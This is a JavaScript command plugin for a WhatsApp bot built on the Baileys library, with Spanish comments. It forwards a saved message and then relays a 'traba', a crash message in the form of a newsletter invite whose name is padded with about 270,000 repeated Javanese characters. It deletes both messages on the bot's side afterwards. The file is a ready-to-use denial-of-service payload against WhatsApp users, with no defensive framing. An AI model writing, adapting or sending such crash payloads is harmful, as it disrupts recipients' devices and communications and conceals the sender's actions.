import fs from 'fs';
import { generateWAMessageFromContent } from '@whiskeysockets/baileys';

const FILE_PATH = './mensajes_guardados.json';

let handler = async (m, { conn }) => {
  try {
    // 1. No permitir en grupos
    if (m.isGroup) return m.reply('❌ Este comando no puede usarse en grupos.');

    // 2. Solo número del bot puede usarlo
    const botNumber = conn.user?.jid || '';
    if (m.sender !== botNumber) {
      return m.reply('❌ Solo el número vinculado al bot puede usar este comando.');
    }

    // 3. Verificar archivo guardado
    if (!fs.existsSync(FILE_PATH)) return m.reply('❌ No hay mensaje guardado.');
    const mensaje = JSON.parse(fs.readFileSync(FILE_PATH, 'utf-8'));
    if (!mensaje?.message) return m.reply('❌ El archivo está dañado o incompleto.');

    // 4. Enviar mensaje guardado tal cual (no generado)
    const enviado1 = await conn.copyNForward(m.chat, mensaje, true);

    // 5. Eliminarlo localmente para el bot
    await conn.sendMessage(m.chat, {
      delete: {
        remoteJid: m.chat,
        fromMe: true,
        id: enviado1.key.id,
        participant: botNumber
      }
    });

    // 6. Generar canal/traba
    const travas = 'ꦾ'.repeat(90000);
    const canalMessage = {
      newsletterAdminInviteMessage: {
        newsletterJid: "120363282786345717@newsletter",
        newsletterName: "🗣🗣🗣🗣" + travas + travas + travas,
        jpegThumbnail: Buffer.from('/9j/4AAQSkZJRgABAQAAAQABAAD/...Z', 'base64'),
        caption: "𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛  ᶻ 𝗓 𐰁",
        inviteExpiration: `${Math.floor(Date.now() / 1000) + 3600}`
      }
    };

    const generado2 = await generateWAMessageFromContent(m.chat, canalMessage, {
      userJid: conn.user.id,
    });

    await conn.relayMessage(m.chat, generado2.message, { messageId: generado2.key.id });

    // 7. Eliminar traba para el bot
    await conn.sendMessage(m.chat, {
      delete: {
        remoteJid: m.chat,
        fromMe: true,
        id: generado2.key.id,
        participant: botNumber
      }
    });

    // 8. Confirmación
    await conn.sendMessage(m.chat, {
      text: '✅ Ambos mensajes fueron enviados y eliminados localmente.'
    }, { quoted: m });

  } catch (e) {
    console.error('[ERROR enviarmsg]:', e);
    return m.reply('❌ Error:\n' + (e.message || e));
  }
};

handler.command = ['enviarmsg'];
export default handler;